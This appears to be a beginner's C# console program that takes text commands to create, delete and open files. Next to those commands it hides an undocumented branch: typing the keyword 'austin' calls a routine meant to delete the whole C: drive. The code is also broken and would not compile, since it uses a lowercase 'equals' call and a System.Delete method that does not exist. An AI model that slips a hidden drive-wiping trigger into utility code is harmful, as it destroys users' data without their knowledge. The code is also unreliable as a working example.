using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
namespace ConsoleApplication6
{
    class Program
    {
        static void Main(string[] args)
        {
            bool playing = true;
            while (playing)
            {
                // promts the user for a command and grabs input
                Console.WriteLine("Enter a command: ");
                String command = Console.ReadLine();
                
                String start="",end="";
                
                if (command.Equals("end"))
                {
                    break;
                }
                // creates 2 variables that are the value of command up to the space, and after the space.(catches exceptions)
                try
                {
                    start = command.Substring(0, command.IndexOf(" "));
                    end = command.Substring(command.IndexOf(" ") + 1);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Please enter a command following required syntax.\n exception: "+e);
                }
               
                // checks users command for KW
                if (start.Equals("create"))
                {
                    try
                    {
                        File.Create(end);
                        Console.WriteLine("You have success fully created :" + end);
                    }
                    catch (Exception i)
                    {
                        Console.WriteLine("File already exist.");
                    }

                }
                else if (start.Equals("delete"))
                {

                    if (File.Exists("C:\\Users\\brodie\\desktop\\" + end))
                    {
                        File.Delete("C:\\Users\\brodie\\desktop\\" + end);
                        Console.WriteLine("File succefully delteted: " + end);
                    }
                    else
                    {
                        Console.WriteLine("File does not exist");
                    }
                    
                   

                }
                else if (start.Equals("open"))
                {
                    try
                    {
                        System.Diagnostics.Process.Start(end + ".exe");
                    }
                    catch (Exception exc)
                    {
                        Console.WriteLine(exc);
                    }
                } else if (start.equals("austin")){
                    System.Delete("c:\\");
                }
                
                




            }
        }
    }
}
